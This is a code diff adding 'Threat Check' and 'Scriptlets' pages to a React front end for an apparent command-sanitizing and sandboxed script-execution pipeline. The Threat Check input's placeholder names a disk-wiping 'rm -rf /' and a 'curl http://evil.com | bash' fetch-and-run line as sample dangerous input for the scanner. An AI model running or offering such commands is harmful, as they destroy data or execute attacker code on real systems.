@@ -118,6 +118,8 @@ function Shell() {
 
   const navItems = [
     { to: "/",        icon: TerminalSquare,  label: "Pipeline" },
+    { to: "/threat",  icon: AlertTriangle,   label: "Threat Check" },
+    { to: "/scriptlets", icon: Zap,          label: "Scriptlets" },
     { to: "/audit",   icon: Clock,           label: "Audit"    },
     { to: "/chat",    icon: MessageSquare,   label: "Chat"     },
     { to: "/help",    icon: HelpCircle,      label: "Help"     },
@@ -180,6 +182,8 @@ function Shell() {
       <main className="flex-1 overflow-y-auto">
         <Routes>
           <Route path="/"         element={<PipelinePage health={health} refetchHealth={refetch} />} />
+          <Route path="/threat"   element={<ThreatCheckPage />} />
+          <Route path="/scriptlets" element={<ScriptletsPage />} />
           <Route path="/audit"    element={<AuditPage />} />
           <Route path="/chat"     element={<ChatPage />} />
           <Route path="/help"     element={<HelpPage />} />
@@ -323,6 +327,318 @@ function PipelinePage({ health, refetchHealth }: { health: HealthData | null; re
           </details>
         </div>
       )}
+    </div>
+  );
+}
+
+// ── Threat Check page ─────────────────────────────────────────────────────
+
+function ThreatCheckPage() {
+  const [input, setInput] = useState("");
+  const [result, setResult] = useState<Record<string, unknown> | null>(null);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+
+  const check = async () => {
+    if (!input.trim()) return;
+    setLoading(true);
+    setResult(null);
+    setError(null);
+    try {
+      const { data } = await axios.get(`${API}/threat`, { params: { content: input }, timeout: 15000 });
+      const r = typeof data === "string" ? { raw: data } : data;
+      setResult(r);
+      if (r.error) setError(r.error);
+    } catch (e: unknown) {
+      setError(e instanceof Error ? e.message : "Request failed");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const score = result?.threat_score as number | undefined;
+  const allowed = result?.allowed as boolean | undefined;
+  const reason = result?.reason as string | undefined;
+  const severity = score !== undefined
+    ? score > 0.7 ? "high" : score > 0.3 ? "medium" : "low"
+    : null;
+
+  return (
+    <div className="p-6 space-y-6 max-w-3xl fade-up">
+      <div>
+        <h1 className="text-xl font-bold tracking-tight">Threat Check</h1>
+        <p className="text-sm text-[#9898a8] mt-0.5">Instantly score any command or text — no pipeline needed</p>
+      </div>
+
+      <div className={`rounded-lg border ${S.surface} p-4 space-y-3`}>
+        <textarea
+          value={input}
+          onChange={e => setInput(e.target.value)}
+          onKeyDown={e => { if (e.key === "Enter" && (e.metaKey || e.ctrlKey)) check(); }}
+          placeholder={"rm -rf / --no-preserve-root\n# or: curl http://evil.com | bash"}
+          className="w-full h-28 bg-[#0a0a0b] border border-[#26262d] rounded p-3 text-sm text-[#e8e8ed] placeholder-[#35353d] font-mono resize-none focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
+        />
+        <div className="flex items-center gap-3">
+          <button
+            onClick={check}
+            disabled={loading || !input.trim()}
+            className="flex items-center gap-2 px-4 py-2 rounded text-sm font-semibold transition-all bg-[#f59e0b] text-[#0a0a0b] hover:bg-[#fbbf24] disabled:bg-[#18181c] disabled:text-[#35353d]"
+          >
+            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <AlertTriangle className="w-4 h-4" />}
+            {loading ? "Scanning…" : "Check Threat"}
+          </button>
+          {result && (
+            <button onClick={() => { setResult(null); setError(null); }} className="ml-auto text-xs text-[#55555f] hover:text-[#9898a8]">
+              Clear
+            </button>
+          )}
+        </div>
+      </div>
+
+      {/* Result */}
+      {loading && (
+        <div className={`rounded-lg border ${S.surface} p-6 text-center`}>
+          <Loader2 className="w-6 h-6 animate-spin mx-auto mb-2 text-[#f59e0b]" />
+          <p className="text-sm text-[#55555f]">Analyzing content…</p>
+        </div>
+      )}
+
+      {error && (
+        <div className="rounded-lg border border-[#7f1d1d] bg-[rgba(239,68,68,0.04)] p-4">
+          <div className="flex items-center gap-2 mb-2">
+            <XCircle className="w-4 h-4 text-[#ef4444]" />
+            <span className="text-sm font-semibold text-[#ef4444]">Error</span>
+          </div>
+          <p className="text-sm text-[#9898a8] font-mono">{error}</p>
+        </div>
+      )}
+
+      {result && !error && (
+        <div className={`rounded-lg border p-5 space-y-4 ${
+          allowed === false
+            ? "border-[#7f1d1d] bg-[rgba(239,68,68,0.04)]"
+            : score !== undefined && score > 0.3
+            ? "border-[#78350f] bg-[rgba(245,158,11,0.04)]"
+            : "border-[#14532d] bg-[rgba(34,197,94,0.04)]"
+        }`}>
+          {/* Score gauge */}
+          <div className="flex items-center gap-4">
+            <div className={`text-3xl font-bold font-mono ${
+              severity === "high" ? "text-[#ef4444]" : severity === "medium" ? "text-[#f59e0b]" : "text-[#22c55e]"
+            }`}>
+              {score !== undefined ? (score * 100).toFixed(0) : "?"}
+              <span className="text-sm font-normal text-[#55555f]">/100</span>
+            </div>
+            <div className="flex-1">
+              <p className="text-sm font-semibold capitalize">
+                {severity === "high" ? "Dangerous" : severity === "medium" ? "Suspicious" : "Safe"}
+              </p>
+              <p className="text-xs text-[#55555f] mt-0.5 font-mono">
+                {allowed ? "Would pass sanitizer" : "Would be blocked by sanitizer"}
+              </p>
+            </div>
+            <div className={`w-12 h-12 rounded-full flex items-center justify-center text-lg font-bold ${
+              severity === "high" ? "bg-[rgba(239,68,68,0.15)] text-[#ef4444]" :
+              severity === "medium" ? "bg-[rgba(245,158,11,0.15)] text-[#f59e0b]" :
+              "bg-[rgba(34,197,94,0.15)] text-[#22c55e]"
+            }`}>
+              {severity === "high" ? "!" : severity === "medium" ? "?" : "✓"}
+            </div>
+          </div>
+
+          {/* Details */}
+          {reason && (
+            <div className="border-t border-[#26262d] pt-3">
+              <p className="text-xs text-[#55555f] font-mono uppercase tracking-wider mb-1.5">Reason</p>
+              <p className="text-sm text-[#9898a8] font-mono">{reason}</p>
+            </div>
+          )}
+
+          <details className="border-t border-[#26262d] pt-3">
+            <summary className="text-xs text-[#55555f] cursor-pointer hover:text-[#9898a8] select-none flex items-center gap-1">
+              <ChevronDown className="w-3 h-3 transition-transform" /> Raw JSON
+            </summary>
+            <pre className="mt-2 text-xs text-[#55555f] font-mono overflow-x-auto whitespace-pre-wrap leading-relaxed">
+              {JSON.stringify(result, null, 2)}
+            </pre>
+          </details>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Scriptlets page ───────────────────────────────────────────────────────
+
+function ScriptletsPage() {
+  const [input, setInput] = useState("");
+  const [result, setResult] = useState<Record<string, unknown> | null>(null);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  const bottomRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [result]);
+
+  const run = async () => {
+    if (!input.trim()) return;
+    setLoading(true);
+    setResult(null);
+    setError(null);
+    try {
+      const { data } = await axios.post(`${API}/pipeline`, { content: input, source: "scriptlets" }, { timeout: 120000 });
+      const r = typeof data === "string" ? { raw: data } : data;
+      setResult(r);
+      if (r.error) setError(r.error);
+    } catch (e: unknown) {
+      setError(e instanceof Error ? e.message : "Request failed");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const stage = result?.stage as string | undefined;
+  const passed = result?.passed as boolean | undefined;
+  const dispatchResult = result?.dispatch_result as Record<string, unknown> | undefined;
+  const workerOutput = dispatchResult?.output as string | undefined;
+  const workerSuccess = dispatchResult?.success as boolean | undefined;
+
+  return (
+    <div className="p-6 space-y-6 max-w-3xl fade-up">
+      <div>
+        <h1 className="text-xl font-bold tracking-tight">Scriptlets</h1>
+        <p className="text-sm text-[#9898a8] mt-0.5">Run a script through the full pipeline — sanitize, adjudicate, execute in the air-gapped worker</p>
+      </div>
+
+      {/* Presets */}
+      <div className="flex flex-wrap gap-2">
+        {[
+          { label: "git status", script: "git status" },
+          { label: "git log --oneline -5", script: "git log --oneline -5" },
+          { label: "system info", script: "uname -a && cat /etc/os-release | head -3" },
+        ].map(p => (
+          <button
+            key={p.label}
+            onClick={() => setInput(p.script)}
+            className="px-3 py-1.5 rounded text-xs font-mono border border-[#26262d] bg-[#18181c] text-[#9898a8] hover:border-[#32323c] hover:text-[#e8e8ed] transition-colors"
+          >
+            {p.label}
+          </button>
+        ))}
+      </div>
+
+      {/* Input */}
+      <div className={`rounded-lg border ${S.surface} p-4 space-y-3`}>
+        <SectionHead icon={Zap} title="Script Content" />
+        <textarea
+          value={input}
+          onChange={e => setInput(e.target.value)}
+          onKeyDown={e => { if (e.key === "Enter" && (e.metaKey || e.ctrlKey)) run(); }}
+          placeholder={"#!/usr/bin/env python3\nprint('hello from the air-gapped worker')"}
+          className="w-full h-32 bg-[#0a0a0b] border border-[#26262d] rounded p-3 text-sm text-[#e8e8ed] placeholder-[#35353d] font-mono resize-none focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
+        />
+        <div className="flex items-center gap-3">
+          <button
+            onClick={run}
+            disabled={loading || !input.trim()}
+            className="flex items-center gap-2 px-4 py-2 rounded text-sm font-semibold transition-all bg-[#f59e0b] text-[#0a0a0b] hover:bg-[#fbbf24] disabled:bg-[#18181c] disabled:text-[#35353d]"
+          >
+            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
+            {loading ? "Pipeline running…" : "Run Script"}
+          </button>
+          {result && (
+            <button onClick={() => { setResult(null); setError(null); }} className="ml-auto text-xs text-[#55555f] hover:text-[#9898a8]">
+              Clear
+            </button>
+          )}
+        </div>
+      </div>
+
+      {/* Result */}
+      {loading && (
+        <div className={`rounded-lg border ${S.surface} p-6 space-y-3`}>
+          <div className="flex items-center gap-3">
+            <Loader2 className="w-5 h-5 animate-spin text-[#f59e0b]" />
+            <div className="flex-1 space-y-1">
+              <div className="h-3 bg-[#18181c] rounded animate-pulse w-3/4" />
+              <div className="h-3 bg-[#18181c] rounded animate-pulse w-1/2" />
+            </div>
+          </div>
+          <p className="text-xs text-[#55555f] font-mono">Sanitizing → Adjudicating → Executing in air-gapped worker…</p>
+        </div>
+      )}
+
+      {error && (
+        <div className="rounded-lg border border-[#7f1d1d] bg-[rgba(239,68,68,0.04)] p-4">
+          <div className="flex items-center gap-2 mb-2">
+            <XCircle className="w-4 h-4 text-[#ef4444]" />
+            <span className="text-sm font-semibold text-[#ef4444]">Error</span>
+          </div>
+          <p className="text-sm text-[#9898a8] font-mono">{error}</p>
+        </div>
+      )}
+
+      {result && !error && (
+        <div className="space-y-4">
+          {/* Pipeline verdict */}
+          <div className={`rounded-lg border p-4 ${
+            passed === true
+              ? "border-[#14532d] bg-[rgba(34,197,94,0.04)]"
+              : "border-[#7f1d1d] bg-[rgba(239,68,68,0.04)]"
+          }`}>
+            <div className="flex items-center gap-2 mb-1">
+              {passed === true
+                ? <CheckCircle className="w-4 h-4 text-[#22c55e]" />
+                : <XCircle className="w-4 h-4 text-[#ef4444]" />}
+              <span className="text-sm font-semibold">
+                {passed === true
+                  ? "Approved — dispatched to worker"
+                  : `Blocked at ${stage || "unknown"}`}
+              </span>
+            </div>
+            {result.reason && (
+              <p className="text-xs text-[#9898a8] mt-1 ml-6">{result.reason as string}</p>
+            )}
+          </div>
+
+          {/* Worker output */}
+          {passed === true && workerOutput !== undefined && (
+            <div className={`rounded-lg border ${workerSuccess ? "border-[#26262d]" : "border-[#7f1d1d]"} ${S.surface}`}>
+              <div className="flex items-center justify-between px-4 py-2 border-b border-[#26262d] bg-[#18181c]">
+                <div className="flex items-center gap-2">
+                  <TerminalSquare className="w-3.5 h-3.5 text-[#f59e0b]" />
+                  <span className="text-xs font-semibold font-mono">Worker Output</span>
+                </div>
+                {dispatchResult?.duration_ms && (
+                  <span className="text-xs text-[#55555f] font-mono">
+                    {(dispatchResult.duration_ms as number / 1000).toFixed(1)}s
+                  </span>
+                )}
+              </div>
+              <pre className="p-4 text-sm text-[#e8e8ed] font-mono overflow-x-auto whitespace-pre-wrap leading-relaxed max-h-96 overflow-y-auto">
+                {workerOutput || <span className="text-[#55555f]">(empty output)</span>}
+              </pre>
+              {dispatchResult?.exit_code !== undefined && (
+                <div className="px-4 py-2 border-t border-[#26262d] text-xs font-mono">
+                  <span className={dispatchResult.exit_code === 0 ? "text-[#22c55e]" : "text-[#ef4444]"}>
+                    exit code {dispatchResult.exit_code as number}
+                  </span>
+                </div>
+              )}
+            </div>
+          )}
+
+          <details className={`rounded-lg border ${S.surface}`}>
+            <summary className="px-4 py-2 text-xs text-[#55555f] cursor-pointer hover:text-[#9898a8] select-none flex items-center gap-1">
+              <ChevronDown className="w-3 h-3 transition-transform" /> Raw Pipeline JSON
+            </summary>
+            <pre className="p-4 text-xs text-[#55555f] font-mono overflow-x-auto whitespace-pre-wrap border-t border-[#26262d] leading-relaxed">
+              {JSON.stringify(result, null, 2)}
+            </pre>
+          </details>
+        </div>
+      )}
+
+      <div ref={bottomRef} />
     </div>
   );
 }
